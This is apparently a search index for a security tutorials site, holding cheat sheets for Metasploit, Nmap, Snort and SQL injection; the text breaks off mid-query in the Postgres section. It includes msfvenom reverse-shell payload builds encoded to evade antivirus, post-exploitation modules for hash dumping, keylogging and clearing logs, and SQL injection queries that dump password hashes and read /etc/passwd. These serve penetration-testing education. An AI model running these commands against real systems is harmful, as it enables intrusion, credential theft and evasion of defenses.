                title: "Metasploit cheat sheet",
                description: "Basic Metasploit Commands Search for a Module msf \u003e search [regex] Specify an Exploit msf \u003e use exploit/[ExploitPath] Set a Payload msf \u003e set PAYLOAD [PayloadPath] Show Options for Current Modules msf \u003e show options Set Options msf \u003e set [Option] [Value] Start Exploit msf \u003e exploit Useful Auxiliary Modules Port Scanner msf \u003e use auxiliary/scanner/portscan/tcp msf \u003e set RHOSTS 10.10.10.0/24 msf \u003e run DNS Enumeration msf \u003e use auxiliary/gather/dns_enum msf \u003e set DOMAIN target.",
                content: "Basic Metasploit Commands\nSearch for a Module\nmsf \u003e search [regex]\nSpecify an Exploit\nmsf \u003e use exploit/[ExploitPath]\nSet a Payload\nmsf \u003e set PAYLOAD [PayloadPath]\nShow Options for Current Modules\nmsf \u003e show options\nSet Options\nmsf \u003e set [Option] [Value]\nStart Exploit\nmsf \u003e exploit\nUseful Auxiliary Modules\nPort Scanner msf \u003e use auxiliary/scanner/portscan/tcp msf \u003e set RHOSTS 10.10.10.0/24 msf \u003e run DNS Enumeration msf \u003e use auxiliary/gather/dns_enum msf \u003e set DOMAIN target.tgt msf \u003e run FTP Server msf \u003e use auxiliary/server/ftp msf \u003e set FTPROOT /tmp/ftproot msf \u003e run Proxy Server msf \u003e use auxiliary/server/socks4 msf \u003e run Msfvenom Tool\nGenerate Payloads $ msfvenom –p [PayloadPath] –f [FormatType] LHOST=[LocalHost] LPORT=[LocalPort] Example:\n$ msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 \u003e met.exe Format Options exe – Executable pl – Perl rb – Ruby raw – Raw shellcode c – C code Encoding Payloads $ msfvenom -p [Payload] -e [Encoder] -f [FormatType] -i [EncodeIterations] LHOST=[LocalHost] LPORT=[LocalPort] Example:\n$ msfvenom -p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 \u003e mal.exe Metasploit Meterpreter Commands\nBase Commands ? / help: Display command summary exit / quit: Exit Meterpreter session sysinfo: Show system name and OS shutdown / reboot: Self-explanatory File System Commands cd, lcd, pwd / getwd, ls, cat download / upload mkdir / rmdir edit Process Commands getpid, getuid, ps, kill, execute, migrate Network Commands ipconfig, portfwd, route Misc Commands idletime, uictl [enable/disable] [keyboard/mouse], screenshot Additional Modules use [module] Example: use priv, hashdump, timestomp Managing Sessions\nMultiple Exploitation Single session, immediately backgrounded: msf \u003e exploit -z Multiple sessions, backgrounded: msf \u003e exploit –j Session Management List jobs: msf \u003e jobs –l Kill a job: msf \u003e jobs –k [JobID] List sessions: msf \u003e sessions -l Interact with a session: msf \u003e session -i [SessionID] Background current session: meterpreter \u003e or meterpreter \u003e background Routing Through Sessions msf \u003e route add [Subnet to Route To] [Subnet Netmask] [SessionID] Advanced Metasploit Usage\nDatabase Interaction db_connect: Connect to a database. db_disconnect: Disconnect from the current database. db_status: Display current database status. hosts: List all hosts in the database. services: List all services in the database. vulns: List all vulnerabilities in the database. Post Exploitation run post/windows/gather/checkvm: Check if the target is a virtual machine. run post/multi/recon/local_exploit_suggester: Suggest local exploits. run post/windows/manage/migrate: Migrate Meterpreter to another process. run getprivs: Attempt to enable all privileges available. run killav: Attempt to kill common antivirus products. Credential Gathering use auxiliary/scanner/smb/smb_login: SMB login utility. use auxiliary/scanner/ssh/ssh_login: SSH login utility. use auxiliary/scanner/http/http_login: HTTP login utility. run post/windows/gather/hashdump: Dump the SAM database. Pivoting autoroute: Automate route addition. socks4a: Setup a SOCKS4a proxy server. use auxiliary/server/socks4a: Start a SOCKS4a proxy server. Exploit Development irb: Drop into an interactive Ruby shell. edit: Edit a file or module. reload_all: Reload all modules. Using Exploits check: Check if the target is vulnerable to the selected exploit. setg / unsetg: Set/unset a global variable. show targets / payloads / advanced / evasion: Show targets, payloads, advanced options, or evasion techniques for the current exploit. Working with Modules use [module type]/[module name]: Load a specific module. back: Move back from the current context. info: Display information about one module. NOPS, Encoders, and Payloads generate: Generate a payload. encode: Encode a payload to evade antivirus detection. nop: Generate a series of NOP instructions. Resource Scripts resource [path/to/script]: Run commands from a resource script file. makerc [path/to/script]: Save the current Metasploit framework commands to a resource script. Console and Environment save: Save the active datastores. setg [variable] [value]: Set a global variable. unsetg [variable]: Unset a global variable. spool [file]: Write console output to a file. Listening and Handlers exploit -j -z: Run an exploit as a job in the background. set ExitOnSession false: Do not terminate the exploit after a session has been created (useful for multi-target exploits). sessions -K: Kill all active sessions. Working with Sessions sessions -i [id]: Interact with a specific session. sessions -u [id]: Upgrade a normal shell to a Meterpreter shell. sessions -k [id]: Kill a specific session. Post Exploitation\nGather Credentials\nuse post/windows/gather/hashdump set SESSION [SessionID] run Capture Keystrokes\nuse post/windows/capture/keylog_recorder set SESSION [SessionID] run Download and Execute Payloads\nuse post/windows/manage/download_exec set SESSION [SessionID] set URL [PayloadURL] set EXE [ExecutableName] run Clear Event Logs\nuse post/windows/manage/clear_event_logs set SESSION [SessionID] run Pivoting\nSetup a SOCKS Proxy\nuse auxiliary/server/socks_proxy set SRVHOST [LocalHost] set SRVPORT [LocalPort] run Add Route for Pivoting\nuse post/multi/manage/autoroute set SESSION [SessionID] set SUBNET [TargetSubnet] set NETMASK [SubnetMask] run Database Commands\nConnect to the Databasemsf \u003e db_connect [user]:[pass]@[host]:[port]/[database] Import Scan Resultsmsf \u003e db_import [filename.xml] Export Datamsf \u003e db_export -f [format] -a [filename] Exploit Development\nCheck if a Module is Loadedmsf \u003e use [module]; info\nReload All Modulesmsf \u003e reload_all\nCheck for Vulnerable Software\nuse auxiliary/scanner/http/version_scanner set RHOSTS [TargetIP] run Advanced Usage\nUse Meterpreter Scriptrun [script]\nExecute System Commands Directlyexecute -f [command] -i\nListening for Incoming Connections\nuse exploit/multi/handler set PAYLOAD [PayloadType] set LHOST [LocalHost] set LPORT [LocalPort] exploit Using Plugins\nLoad a plugin: load [plugin] Unload a plugin: unload [plugin] Miscellaneous\nWorking with Workspaces Create: workspace -a [name] Switch: workspace [name] Delete: workspace -d [name] Using Resource Scripts Run a resource script: resource [path/to/script.rc] Generating Reports Generate a report: db_export -f [format] [filename] "
            }
        );
    index.add(
            {
                id:  4 ,
                href: "\/tutorials\/docs\/cheatsheets\/nmap_cs\/",
                title: "Nmap cheat sheet",
                description: "Target Specification link nmap [target] - Scan a single IP or hostname. nmap [target1,target2,etc.] - Scan multiple targets. nmap -iL [list.txt] - Scan targets from a list in a file. nmap [range of IP addresses] - Scan a range of IPs. nmap [IP address/cidr] - Scan a network using CIDR notation. nmap -iR [number] - Scan random hosts. nmap [targets] --exclude [targets] - Exclude listed hosts. nmap [targets] --excludefile [list.txt] - Exclude targets from a file.",
                content: "Target Specification link nmap [target] - Scan a single IP or hostname. nmap [target1,target2,etc.] - Scan multiple targets. nmap -iL [list.txt] - Scan targets from a list in a file. nmap [range of IP addresses] - Scan a range of IPs. nmap [IP address/cidr] - Scan a network using CIDR notation. nmap -iR [number] - Scan random hosts. nmap [targets] --exclude [targets] - Exclude listed hosts. nmap [targets] --excludefile [list.txt] - Exclude targets from a file. Host Discovery link nmap -sP [target] - Ping scan (no port scan). nmap -PS [target] - TCP SYN ping. nmap -PA [target] - TCP ACK ping. nmap -PU [target] - UDP ping. nmap -PE [target] - ICMP echo request ping. nmap -PP [target] - ICMP timestamp request ping. nmap -PM [target] - ICMP address mask request ping. nmap -PO [target] - IP protocol ping. nmap -PR [target] - ARP ping (local network only). Scan Techniques link nmap -sS [target] - TCP SYN scan (default). nmap -sT [target] - TCP connect scan. nmap -sU [target] - UDP scan. nmap -sA [target] - TCP ACK scan. nmap -sW [target] - TCP Window scan. nmap -sM [target] - TCP Maimon scan. nmap -sN [target] - TCP Null scan. nmap -sF [target] - TCP FIN scan. nmap -sX [target] - TCP Xmas scan. nmap -sO [target] - IP protocol scan. Service and Version Detection link nmap -sV [target] - Probe open ports to determine service/version info. nmap -sV --version-intensity [0-9] [target] - Set intensity level of version detection. nmap -sV --version-light [target] - Enable light mode for version scanning. nmap -sV --version-all [target] - Enable intense mode for version scanning. OS Detection link nmap -O [target] - Enable OS detection. nmap -O --osscan-limit [target] - Limit OS detection to confirmed open ports. nmap -O --osscan-guess [target] - Guess more aggressively about OS detection. nmap -O --max-os-tries [number] [target] - Set the maximum number of OS detection tries. Timing and Performance link nmap -T0 [target] - Paranoid (IDS evasion). nmap -T1 [target] - Sneaky (IDS evasion). nmap -T2 [target] - Polite (slows down the scan). nmap -T3 [target] - Normal (default speed). nmap -T4 [target] - Aggressive (speeds scans). nmap -T5 [target] - Insane (fastest scans). Nmap Scripting Engine (NSE) link nmap --script [script.nse] [target] - Execute specific NSE script. nmap --script [category] [target] - Execute scripts in a specific category. nmap --script \"not intrusive\" [target] - Execute default scripts excluding intrusive ones. Firewall/IDS Evasion and Spoofing link nmap -f [target] - Fragment packets to evade firewalls. nmap --mtu [MTU] [target] - Specify a custom MTU size. nmap -D RND:[number] [target] - Randomize decoy addresses. nmap -S [IP] [target] - Spoof source address. nmap -e [interface] [target] - Use specified network interface. nmap -g [port number] [target] - Use specified source. nmap --source-port [port number] [target] - Use given source port. nmap --data-length [number] [target]- Append random data to packets. nmap --randomize-hosts [target] - Randomize target scanning order. nmap --spoof-mac [MAC|0|vendor] [target]- Spoof MAC address. `` nmap --badsum [target] - Generate packets with a bad checksum. Output Options link nmap -oN [file] [target] - Normal output to a file. nmap -oX [file] [target] - XML output to a file. nmap -oG [file] [target] - Grepable output to a file. nmap -oA [path/filename] [target] - Output in all formats. nmap --open [target] - Show only open ports. nmap --packet-trace [target] - Show all packets sent and received. nmap --iflist - List interfaces and routes. nmap --resume [file] - Resume an interrupted scan. nmap --stylesheet [path] [target] - Apply XSL stylesheet to XML output. nmap --webxml - Use default Nmap.org stylesheet for XML. oN [file]: Standard Nmap output to a file. oG [file]: Greppable format output to a file. oX [file]: XML format output to a file. oA [path/filename]: Generate Nmap, Greppable, and XML output files using basename for files. Miscellaneous Options link nmap -6 [target] - Enable IPv6 scanning. nmap --datadir [directory] - Specify custom Nmap data file location. nmap --send-eth/--send-ip [target] - Send packets using raw IP packets or Ethernet frames. nmap --privileged - Assume that the user is fully privileged. nmap --unprivileged - Assume the user lacks raw socket privileges. Port Specification and Scan Order link p -: Scans a port range. p ,,...: Scans a list of ports. pU:53,U:110,T20-445: Mix TCP and UDP. r: Scans linearly (does not randomize ports). -top-ports : Scan the n most popular ports. p-65535: Leaving off the initial port in range makes Nmap scan start at port 1. p-: Leaving off the end port in range makes Nmap scan all ports. F: Fast (limited port) scan. Port Status link Open: An application is listening for connections on this port. Closed: Probes were received but no application is listening on this port. Filtered: Probes were not received, indicating that they are being dropped by some kind of filtering. Unfiltered: Probes were received but a state could not be established. Open/Filtered: The port was filtered or open but Nmap couldn’t establish the state. Closed/Filtered: The port was filtered or closed but Nmap couldn’t establish the state. Fine-Grained Timing Options link -min-hostgroup/max-hostgroup : Parallel host scan group sizes. -min-parallelism/max-parallelism : Probes parallelization. -min-rtt-timeout/max-rtttimeout/initial-rtt-timeout : Specifies probe round trip time. -max-retries : Caps number of port scan probe retransmissions. -host-timeout : Gives up on target after this time. -scan-delay/--max-scan-delay : Adjusts delay between probes. -min-rate : Send packets no slower than this number per second. -max-rate : Send packets no faster than this number per second. Nmap Scripting Engine Categories link auth: Utilize credentials or bypass authentication on target hosts. broadcast: Discover hosts by broadcasting on the local network. brute: Attempt to guess passwords for a variety of protocols. default: Scripts run automatically with -sC or -A. discovery: Learn more information about target hosts through various methods. dos: May cause denial of service conditions in target hosts. exploit: Attempt to exploit target systems. external: Interact with third-party systems. fuzzer: Send unexpected input in network protocol fields intrusive: May impact target machines in a malicious fashion. malware: Look for signs of malware infection on target hosts. safe: Designed not to impact target negatively. version: Measure the version of software or protocols on the target hosts vuln: Measure whether target systems have a known vulnerability. Additional Options link n: Disables reverse IP address lookups. -reason: Displays the reason Nmap thinks that the port is open, closed, or filtered. A: Enables several features, including OS Detection, Version Detection, Script Scanning (default), and traceroute. 6: Use IPv6 only. -reason: Displays the reason Nmap thinks that the port is open, closed, or filtered. Probing Options link Pn: Don’t probe (assume all hosts are up). PB: Default probe (TCP 80, 445 \u0026 ICMP). PS: Check if systems are online by probing TCP ports. PE: Use ICMP Echo Request for probing. PP: Use ICMP Timestamp Request for probing. PM: Use ICMP Netmask Request for probing. Scan Types link sn: Probe only (host discovery, not port scan). sS: SYN Scan. sT: TCP Connect Scan. sU: UDP Scan. sV: Version Scan. O: Used for OS Detection/fingerprinting. -scanflags: Sets a custom list of TCP using URG ACK PSH RST SYN FIN in any order. Timing Options link T0 (Paranoid): Very slow, used for IDS evasion. T1 (Sneaky): Quite slow, used for IDS evasion. T2 (Polite): Slows down to consume less bandwidth, runs ~10 times slower than default. T3 (Normal): Default, a dynamic timing model based on target responsiveness. T4 (Aggressive): Assumes a fast and reliable network and may overwhelm targets. T5 (Insane): Very aggressive; will likely overwhelm targets or miss open ports. Nmap Scripting Engine (NSE) - Specific Scripts link dns-zone-transfer: Attempts a zone file (AXFR) from a DNS server. $ nmap --script dns-zonetransfer.nse --script-args dns-zonetransfer.domain= -p53 http-robots.txt: Harvests robots.txt files from discovered web servers. $ nmap --script http-robots.txt smb-brute: Attempts to determine valid username and password combinations via automated guessing. $ nmap --script smb-brute.nse -p445 smb-psexec: Attempts to run a series of programs on the target machine, using provided credentials as script arguments. $ nmap --script smb-psexec.nse –script-args=smbuser=,smbpass=[,config=] -p445 A: Enables several features, including OS Detection, Version Detection, Script Scanning (default), and traceroute. 6: Use IPv6 only. -reason: Displays the reason Nmap thinks that the port is open, closed, or filtered. The full list of Nmap Scripting Engine scripts can be found at the official Nmap website: Nmap Scripting Engine Documentation.\nRunning individual or groups of scripts: nmap --script=||\nUsing the list of script arguments: nmap --script-args="
            }
        );
    index.add(
            {
                id:  5 ,
                href: "\/tutorials\/docs\/cheatsheets\/snort_cs\/",
                title: "Snort cheat sheet",
                description: "Sniffer Mode link v: Verbose mode, shows packet headers. e: Display link layer headers. d: Show application layer data (payload). x: Display packets with headers in hexadecimal format. q: Run Snort in quiet mode, less output to the console. Packet Logger Mode link r: Read and process packets from a file (playback). l : Log the packets to a directory. k : Keep data link layer information. can be none, normal, or strict.",
                content: "Sniffer Mode link v: Verbose mode, shows packet headers. e: Display link layer headers. d: Show application layer data (payload). x: Display packets with headers in hexadecimal format. q: Run Snort in quiet mode, less output to the console. Packet Logger Mode link r: Read and process packets from a file (playback). l : Log the packets to a directory. k : Keep data link layer information. can be none, normal, or strict. NIDS Mode link c : Use the specified configuration file. T: Test the current Snort configuration. A : Set the alert mode (full, fast, console, none). s: Send alert messages to the syslog. M : Send SMB alerts to the specified IP address. Additional Commands and Options link i : Listen on the specified network interface. u : Run Snort under the specified user account. g : Run Snort under the specified group account. F : Use the specified Berkley Packet Filter file. t : Run Snort in a chroot jail. D: Run Snort as a daemon (background mode). Snort Rules Format link Actions include alert, log, pass, activate, dynamic, drop, reject, sdrop. Protocols include tcp, udp, icmp, ip. Snort Rule Example link alert tcp $EXTERNAL_NET any -\u003e $HOME_NET 22 (msg:\"Possible SSH scan\"; flags:S; threshold: type threshold, track by_src, count 5, seconds 60; sid:1000001;) Tips for Writing Snort Rules link Always start your rule with an action and protocol. Specify source and destination IPs and ports using \u003e for direction. Use msg to define the alert message. Use sid to uniquely identify each rule. Use rev to specify the revision of the rule. Advanced Rule Options link content: Look for specific content in the payload. flags: Check for specific TCP flags. threshold: Define thresholds for alerts to minimize false positives. Log and Data Management link Use /var/log/snort/ or your defined directory to check for logs. Regularly rotate and archive logs to prevent disk space issues. Troubleshooting link Use v for a more verbose output if you are not receiving the expected results. Make sure your Snort rules are correctly formatted and loaded. Check Snort’s documentation for complex rule writing. "
            }
        );
    index.add(
            {
                id:  6 ,
                href: "\/tutorials\/docs\/cheatsheets\/sql_injection_cs\/",
                title: "SQL Injection cheat sheet",
                description: "MySQL SQL Injection link Command SQL Query Explanation Version SELECT @@version Retrieves the version of the MySQL server. Comments SELECT 1; #comment\nSELECT /comment/1; Demonstrates how to use comments in SQL queries. Single-line and multi-line comments are shown. Current User SELECT user();\nSELECT system_user(); Retrieves the current MySQL user and the system user that the MySQL server is running as. List Users SELECT user FROM mysql.user; — priv Lists all users in the MySQL database.",
                content: "MySQL SQL Injection link Command SQL Query Explanation Version SELECT @@version Retrieves the version of the MySQL server. Comments SELECT 1; #comment\nSELECT /comment/1; Demonstrates how to use comments in SQL queries. Single-line and multi-line comments are shown. Current User SELECT user();\nSELECT system_user(); Retrieves the current MySQL user and the system user that the MySQL server is running as. List Users SELECT user FROM mysql.user; — priv Lists all users in the MySQL database. Requires administrative privileges. List Password Hashes SELECT host, user, password FROM mysql.user; — priv Retrieves host, username, and password hashes from the MySQL user table. Requires administrative privileges. Password Cracker http://www.openwall.com/john/ Suggests a tool for cracking MySQL password hashes. List Privileges SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — priv\nSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv Lists various user privileges. The first query lists privileges from the information_schema database, while the second query lists detailed privileges for each user from the mysql.user table. Both require administrative privileges. List DBA Accounts SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;\nSELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; — priv Lists database administrator accounts. The first query checks user privileges in the information_schema, and the second query checks the Super_priv column in mysql.user. Both require administrative privileges. Current Database SELECT database() Retrieves the name of the current database. List Databases SELECT schema_name FROM information_schema.schemata; — for MySQL \u003e= v5.0\nSELECT distinct(db) FROM mysql.db — priv Lists all databases. The first query lists schemas for MySQL version 5.0 and above, while the second query retrieves databases from the mysql.db table and requires administrative privileges. List Columns SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ Lists columns in all tables, excluding system tables, in the information_schema database. List Tables SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ Lists all tables, excluding system tables, in the information_schema database. Find Tables From Column Name SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; Finds tables that contain a column named ‘username’ in the information_schema database. Select Nth Row SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0\nSELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0 Selects the Nth row from a table. The OFFSET keyword is used to specify which row to start from. Select Nth Char SELECT substr(‘abcd’, 3, 1); # returns c Selects the Nth character from a string. In this example, it returns the 3rd character from the string ‘abcd’. Bitwise AND SELECT 6 \u0026 2; # returns 2\nSELECT 6 \u0026 1; # returns 0 Demonstrates the use of bitwise AND operation in SQL. In these examples, it performs a bitwise AND on the numbers 6 and 2, and 6 and 1, respectively. ASCII Value -\u003e Char SELECT char(65); # returns A Converts an ASCII value to its corresponding character. In this example, ASCII 65 is converted to ‘A’. Char -\u003e ASCII Value SELECT ascii(‘A’); # returns 65 Converts a character to its corresponding ASCII value. In this example, ‘A’ is converted to ASCII 65. Casting SELECT cast(‘1’ AS unsigned integer);\nSELECT cast(‘123’ AS char); Demonstrates how to cast data types in SQL. The first query casts the string ‘1’ to an unsigned integer, and the second query casts the string ‘123’ to a character data type. String Concatenation SELECT CONCAT(‘A’,‘B’); #returns AB\nSELECT CONCAT(‘A’,‘B’,‘C’); # returns ABC Shows how to concatenate strings in SQL. The first query concatenates ‘A’ and ‘B’, and the second query concatenates ‘A’, ‘B’, and ‘C’. If Statement SELECT if(1=1,‘foo’,‘bar’); — returns ‘foo’ Demonstrates the use of an IF statement in SQL. This query checks if 1 equals 1 and returns ‘foo’; otherwise, it would return ‘bar’. Case Statement SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A Demonstrates the use of a CASE statement in SQL. This query checks if 1 equals 1 and returns ‘A’; otherwise, it would return ‘B’. Avoiding Quotes SELECT 0x414243; # returns ABC Shows how to use hexadecimal values to avoid quotes in SQL queries. This query returns the string ‘ABC’ from its hexadecimal representation. Time Delay SELECT BENCHMARK(1000000,MD5(‘A’));\nSELECT SLEEP(5); # \u003e= 5.0.12 Introduces methods to create a time delay in SQL queries. The BENCHMARK function repeats an operation a specified number of times, and SLEEP pauses execution for a specified number of seconds. Make DNS Requests Impossible? Notes that making DNS requests through MySQL is generally not possible. Command Execution http://www.0xdeadbeef.info/exploits/raptor_udf.c Explains how to execute OS commands via MySQL under certain conditions, by uploading a shared object file into the server’s library directory. Requires administrative privileges and specific server configurations. Local File Access …’ UNION ALL SELECT LOAD_FILE(’/etc/passwd’) — priv, can only read world-readable files.\nSELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system Demonstrates how to access local files through SQL queries. The first query reads a file, and the second writes to a file. Both require administrative privileges. Hostname, IP Address SELECT @@hostname; Retrieves the hostname of the MySQL server. Create Users CREATE USER test1 IDENTIFIED BY ‘pass1’; — priv Creates a new user in MySQL with the specified password. Requires administrative privileges. Delete Users DROP USER test1; — priv Deletes a user from MySQL. Requires administrative privileges. Make User DBA GRANT ALL PRIVILEGES ON . TO test1@’%’; — priv Grants a user all privileges on all databases and tables, effectively making them a DBA. Requires administrative privileges. Location of DB files SELECT @@datadir; Retrieves the directory where database files are stored in the MySQL server. Default/System Databases information_schema (\u003e= mysql 5.0)\nmysql Lists default and system databases in MySQL. ‘information_schema’ is available from MySQL version 5.0 and above, and ‘mysql’ is the system database that contains user and privilege information. Oracle SQL Injection link Command SQL Query Explanation Version SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;\nSELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;\nSELECT version FROM v$instance; Retrieves the version of the Oracle database. The first query gets the Oracle DB version, the second gets the Oracle TNS Listener version, and the third gets the instance version. Comments SELECT 1 FROM dual — comment Demonstrates how to use comments in SQL queries in Oracle. ‘dual’ is a special table used in Oracle. Current User SELECT user FROM dual Retrieves the current user of the Oracle database. List Users SELECT username FROM all_users ORDER BY username;\nSELECT name FROM sys.user$; — priv Lists all users in the Oracle database. The first query lists usernames from the all_users view, and the second query, which requires administrative privileges, lists users from the sys.user$ table. List Password Hashes SELECT name, password, astatus FROM sys.user$ — priv, \u003c= 10g. astatus tells you if acct is locked\nSELECT name,spare4 FROM sys.user$ — priv, 11g Retrieves user names and password hashes from the Oracle database. The first query is for Oracle versions up to 10g and includes account status, while the second query is for version 11g. Both require administrative privileges. Password Cracker http://www.red-database-security.com/software/checkpwd.html Suggests a tool for cracking Oracle password hashes. List Privileges SELECT * FROM session_privs; — current privs\nSELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs\nSELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv\nSELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; Lists privileges of users in the Oracle database. The first query lists current session privileges, the second lists privileges of a specific user, the third finds users with a particular privilege, and the fourth lists roles granted to users. The last three queries require administrative privileges. List DBA Accounts SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles Lists database administrator accounts in Oracle. This query finds users with administrative privileges and requires administrative privileges itself. Current Database SELECT global_name FROM global_name;\nSELECT name FROM v$database;\nSELECT instance_name FROM v$instance;\nSELECT SYS.DATABASE_NAME FROM DUAL; Retrieves the name of the current Oracle database. Each query provides a different way to obtain the current database or instance name. List Databases SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)\n— Also query TNS listener for other databases. See http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html (services status). List Columns SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;\nSELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’; Lists columns in Oracle tables. The first query lists columns of a specified table, and the second query specifies both table and owner. List Tables SELECT table_name FROM all_tables;\nSELECT owner, table_name FROM all_tables; Lists all tables in Oracle. The first query lists table names, and the second includes the owner of each table. Find Tables From Column Name SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; — NB: table names are upper case Finds Oracle tables that contain a specific column. The query lists tables with a column name like ‘%PASS%’. Note that Oracle table names are usually in uppercase. Select Nth Row SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1) Retrieves the Nth row from a result set in Oracle. This example gets the 9th row from the all_users table. Oracle rows are numbered starting from 1. Select Nth Char SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’ Retrieves the Nth character from a string in Oracle. This example gets the 3rd character from ‘abcd’. Bitwise AND SELECT bitand(6,2) FROM dual; — returns 2\nSELECT bitand(6,1) FROM dual; — returns 0 Demonstrates the use of bitwise AND in Oracle. The first query returns 2, and the second returns 0. ASCII Value -\u003e Char SELECT chr(65) FROM dual; — returns A Converts an ASCII value to its corresponding character in Oracle. This example converts ASCII 65 to ‘A’. Char -\u003e ASCII Value SELECT ascii(‘A’) FROM dual; — returns 65 Converts a character to its corresponding ASCII value in Oracle. This example converts ‘A’ to ASCII 65. Casting SELECT CAST(1 AS char) FROM dual;\nSELECT CAST(‘1’ AS int) FROM dual; Demonstrates how to cast data types in Oracle SQL. The first query casts the number 1 to a character, and the second casts the string ‘1’ to an integer. String Concatenation SELECT ‘A’ If Statement BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements Demonstrates the use of an IF statement in Oracle, using PL/SQL. This example uses dbms_lock.sleep for a conditional time delay. Note that IF statements are typically used in PL/SQL blocks rather than directly in SELECT statements. Case Statement SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1\nSELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2 Demonstrates the use of a CASE statement in Oracle SQL. The first query returns 1 if the condition is true (1=1), and the second returns 2 if the condition is false (1=2). Avoiding Quotes SELECT chr(65) Time Delay BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT\nSELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; — if reverse looks are slow\nSELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow\nSELECT UTL_HTTP.REQUEST(‘http://google.com/') FROM dual; — if outbound TCP is filtered / slow\n— Also see http://technet.microsoft.com/en-us/library/cc512676.aspx to create a time delay Introduces methods to create a time delay in Oracle SQL. The DBMS_LOCK.SLEEP function pauses execution, but it’s generally not embeddable in a SELECT statement. Other methods involve slow network operations. Make DNS Requests SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;\nSELECT UTL_HTTP.REQUEST(‘http://google.com/') FROM dual; Demonstrates how to make DNS requests in Oracle SQL. The first query resolves an IP address, and the second makes an HTTP request. Command Execution http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql Provides a link to an exploit that can be used to execute commands in Oracle under certain conditions. Local File Access http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql — can sometimes be used. Check that the following is non-null: SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;\nhttp://www.0xdeadbeef.info/exploits/raptor_oraexec.sql — can be used to read and write files if installed (not available in Oracle Express). Provides links to exploits that can be used for local file access in Oracle. The first exploit checks the ‘utl_file_dir’ parameter, and the second exploit can be used to read and write files. Hostname, IP Address SELECT UTL_INADDR.get_host_name FROM dual;\nSELECT host_name FROM v$instance;\nSELECT UTL_INADDR.get_host_address FROM dual; — gets IP address\nSELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; — gets hostnames Retrieves the hostname and IP address of the Oracle server. The queries use different functions and views to obtain this information. Location of DB files SELECT name FROM V$DATAFILE; Retrieves the locations of database files in Oracle. This query lists the data files as seen in the V$DATAFILE view. Default/System Databases SYSTEM\nSYSAUX Lists default and system databases in Oracle. ‘SYSTEM’ and ‘SYSAUX’ are key system tablespaces in Oracle. Postgres SQL Injection link Command SQL Query Explanation Version SELECT version() Retrieves the version of the PostgreSQL database. Comments SELECT 1; –comment\nSELECT /comment/1; Demonstrates how to use comments in SQL queries in PostgreSQL. Both – and /* */ are used for commenting. Current User SELECT user;\nSELECT current_user;\nSELECT session_user;\nSELECT usename FROM pg_user;\nSELECT getpgusername(); Retrieves the current user of the PostgreSQL database. Multiple ways are shown to get the username, including from the pg_user system table. List Users SELECT usename FROM pg_user Lists all users in the PostgreSQL database. pg_user is a system catalog view that shows user information. List Password Hashes SELECT usename, passwd FROM pg_shadow – priv Retrieves user names and password hashes from the PostgreSQL database. This query requires administrative privileges and is run on the pg_shadow table, which contains information about users. Password Cracker http://pentestmonkey.net/blog/cracking-postgres-hashes/ Suggests a tool for cracking PostgreSQL’s MD5-based password hashes. List Privileges SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user Lists privileges of users in the PostgreSQL database. The query shows which users have privileges like creating databases, superuser access, and catalog update permissions. List DBA Accounts SELECT usename FROM pg_user WHERE usesuper IS TRUE Lists database administrator accounts in PostgreSQL. This query finds users with superuser privileges. Current Database SELECT current_database() Retrieves the name of the current PostgreSQL database. current_database() is a function that returns the database name. List Databases SELECT datname FROM pg_database Lists all databases in PostgreSQL. pg_database is a system catalog that contains information about databases. List Columns SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE 